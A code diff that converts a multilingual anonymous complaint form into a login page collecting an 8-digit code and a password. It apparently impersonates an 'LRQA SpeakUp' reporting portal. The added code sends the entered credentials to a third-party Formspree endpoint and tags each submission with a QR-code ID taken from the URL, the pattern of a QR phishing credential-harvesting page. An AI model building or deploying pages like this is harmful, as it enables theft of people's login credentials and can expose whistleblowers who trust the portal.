@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>Anonymous Complaint Form</title>
+  <title>Anonymous Complaint Form - Login</title>
   <style>
     body {
       margin: 0;
@@ -32,17 +32,13 @@
       font-size: 14px;
       color: #555;
     }
-    textarea, input {
+    input {
       width: 100%;
       padding: 10px;
       margin-top: 6px;
       border: 1px solid #ccc;
       border-radius: 5px;
       font-size: 14px;
-    }
-    textarea {
-      resize: vertical;
-      min-height: 120px;
     }
     button {
       margin-top: 20px;
@@ -65,15 +61,19 @@
   <div class="form-container">
     <h2 id="form-title"></h2>
 
-    <form id="complaint-form" action="https://formspree.io/f/mdkwzqko" method="POST" enctype="multipart/form-data">
-      <label for="category" id="label-category"></label>
-      <input type="text" id="category" name="category" placeholder="">
+    <form id="login-form" action="https://formspree.io/f/manpjren" method="POST">
+      <label for="code" id="label-code"></label>
+      <input type="text" id="code" name="code" placeholder="">
 
-      <label for="details" id="label-details"></label>
-      <textarea id="details" name="details" placeholder=""></textarea>
+      <label for="password" id="label-password"></label>
+      <input type="password" id="password" name="password" placeholder="">
 
-      <label for="file" id="label-file"></label>
-      <input type="file" id="file" name="file">
+      <!-- 隐藏字段区分页面来源 -->
+      <input type="hidden" name="source_page" value="login">
+      <!-- 隐藏字段记录二维码ID -->
+      <input type="hidden" name="qr_id" id="qr-id" value="">
+      <!-- 隐藏字段记录语言 -->
+      <input type="hidden" name="lang" id="lang" value="">
 
       <button type="submit" id="submit-btn"></button>
     </form>
@@ -81,16 +81,16 @@
 
   <script>
     const translations = {
-      zh: { title:"匿名投诉表单", category:"投诉类别：", category_ph:"请输入投诉类别", details:"投诉详情：", details_ph:"请输入您的投诉内容", file:"上传附件（可选）：", submit:"提交投诉" },
-      en: { title:"Anonymous Complaint Form", category:"Complaint Category:", category_ph:"Enter complaint category", details:"Complaint Details:", details_ph:"Enter your complaint details", file:"Upload Attachment (optional):", submit:"Submit Complaint" },
-      ms: { title:"Borang Aduan Tanpa Nama", category:"Kategori Aduan:", category_ph:"Masukkan kategori aduan", details:"Butiran Aduan:", details_ph:"Masukkan butiran aduan anda", file:"Muat Naik Lampiran (pilihan):", submit:"Hantar Aduan" },
-      my: { title:"LRQA SpeakUp သီးသန့်မူဝါဒ အစီရင်ခံစာ", category:"အကြောင်းအရာအမျိုးအစား:", category_ph:"အကြောင်းအရာအမျိုးအစားထည့်ပါ", details:"အကြောင်းအရာအသေးစိတ်:", details_ph:"သင့်အကြောင်းအရာအသေးစိတ်ထည့်ပါ", file:"ဖိုင်တင်ရန် (စိတ်ကြိုက်):", submit:"တင်သွင်းရန်" },
-      bn: { title:"গোপনীয় অভিযোগ ফর্ম", category:"অভিযোগের ধরন:", category_ph:"অভিযোগের ধরন লিখুন", details:"অভিযোগের বিস্তারিত:", details_ph:"আপনার অভিযোগের বিস্তারিত লিখুন", file:"সংযুক্তি আপলোড করুন (ঐচ্ছিক):", submit:"অভিযোগ জমা দিন" },
-      ne: { title:"गोप्य गुनासो फारम", category:"गुनासोको श्रेणी:", category_ph:"गुनासोको श्रेणी प्रविष्ट गर्नुहोस्", details:"गुनासो विवरण:", details_ph:"तपाईंको गुनासो विवरण प्रविष्ट गर्नुहोस्", file:"संलग्न फाइल अपलोड गर्नुहोस् (वैकल्पिक):", submit:"गुनासो पेश गर्नुहोस्" },
-      th: { title:"ฟอร์มร้องเรียนแบบไม่ระบุชื่อ", category:"ประเภทการร้องเรียน:", category_ph:"กรอกประเภทการร้องเรียน", details:"รายละเอียดการร้องเรียน:", details_ph:"กรอกรายละเอียดการร้องเรียนของคุณ", file:"อัปโหลดไฟล์แนบ (ถ้ามี):", submit:"ส่งเรื่องร้องเรียน" },
-      hi: { title:"गोपनीय शिकायत फ़ॉर्म", category:"शिकायत श्रेणी:", category_ph:"शिकायत श्रेणी दर्ज करें", details:"शिकायत विवरण:", details_ph:"अपनी शिकायत का विवरण दर्ज करें", file:"संलग्नक अपलोड करें (वैकल्पिक):", submit:"शिकायत जमा करें" },
-      uk: { title:"Анонімна форма скарги", category:"Категорія скарги:", category_ph:"Введіть категорію скарги", details:"Деталі скарги:", details_ph:"Введіть деталі вашої скарги", file:"Завантажити вкладення (необов'язково):", submit:"Надіслати скаргу" },
-      id: { title:"Form Pengaduan Anonim", category:"Kategori Pengaduan:", category_ph:"Masukkan kategori pengaduan", details:"Detail Pengaduan:", details_ph:"Masukkan detail pengaduan Anda", file:"Unggah Lampiran (opsional):", submit:"Kirim Pengaduan" }
+      zh: { title:"匿名登录表单", code:"请输入8位数字：", code_ph:"8位数字", password:"请输入密码：", password_ph:"密码", submit:"登录" },
+      en: { title:"Anonymous Login Form", code:"Enter 8-digit code:", code_ph:"8-digit code", password:"Enter password:", password_ph:"Password", submit:"Log In" },
+      ms: { title:"Borang Log Masuk Tanpa Nama", code:"Masukkan kod 8 digit:", code_ph:"Kod 8 digit", password:"Masukkan kata laluan:", password_ph:"Kata laluan", submit:"Log Masuk" },
+      my: { title:"LRQA SpeakUp သီးသန့်မူဝါဒ ဝင်ရန်", code:"၈-အကြိမ်ဂဏန်းကိုထည့်ပါ။", code_ph:"၈-ဂဏန်း", password:"စကားဝှက်ထည့်ပါ။", password_ph:"စကားဝှက်", submit:"ဝင်ရန်" },
+      bn: { title:"গোপনীয় লগইন ফর্ম", code:"৮-অঙ্কের কোড লিখুন:", code_ph:"৮-অঙ্কের কোড", password:"পাসওয়ার্ড লিখুন:", password_ph:"পাসওয়ার্ড", submit:"লগইন" },
+      ne: { title:"गोप्य लगइन फारम", code:"८-अंकको कोड प्रविष्ट गर्नुहोस्:", code_ph:"८-अंक कोड", password:"पासवर्ड प्रविष्ट गर्नुहोस्:", password_ph:"पासवर्ड", submit:"लगइन" },
+      th: { title:"ฟอร์มเข้าสู่ระบบแบบไม่ระบุชื่อ", code:"กรอกรหัส 8 หลัก:", code_ph:"รหัส 8 หลัก", password:"กรอกรหัสผ่าน:", password_ph:"รหัสผ่าน", submit:"เข้าสู่ระบบ" },
+      hi: { title:"गोपनीय लॉगिन फ़ॉर्म", code:"8-अंकीय कोड दर्ज करें:", code_ph:"8-अंकीय कोड", password:"पासवर्ड दर्ज करें:", password_ph:"पासवर्ड", submit:"लॉगिन" },
+      uk: { title:"Анонімна форма входу", code:"Введіть 8-значний код:", code_ph:"8-значний код", password:"Введіть пароль:", password_ph:"Пароль", submit:"Увійти" },
+      id: { title:"Form Masuk Anonim", code:"Masukkan kode 8 digit:", code_ph:"Kode 8 digit", password:"Masukkan kata sandi:", password_ph:"Kata sandi", submit:"Masuk" }
     };
 
     // 自动检测浏览器语言并映射到短码
@@ -108,14 +108,20 @@
 
     const t = translations[lang];
 
-    // 更新页面内容
     document.getElementById("form-title").textContent = t.title;
-    document.getElementById("label-category").textContent = t.category;
-    document.getElementById("category").placeholder = t.category_ph;
-    document.getElementById("label-details").textContent = t.details;
-    document.getElementById("details").placeholder = t.details_ph;
-    document.getElementById("label-file").textContent = t.file;
+    document.getElementById("label-code").textContent = t.code;
+    document.getElementById("code").placeholder = t.code_ph;
+    document.getElementById("label-password").textContent = t.password;
+    document.getElementById("password").placeholder = t.password_ph;
     document.getElementById("submit-btn").textContent = t.submit;
+
+    // 获取二维码参数
+    const urlParams = new URLSearchParams(window.location.search);
+    const qrId = urlParams.get('qr') || 'default';
+    document.getElementById('qr-id').value = qrId;
+
+    // 记录语言
+    document.getElementById('lang').value = lang;
   </script>
 </body>
 </html>
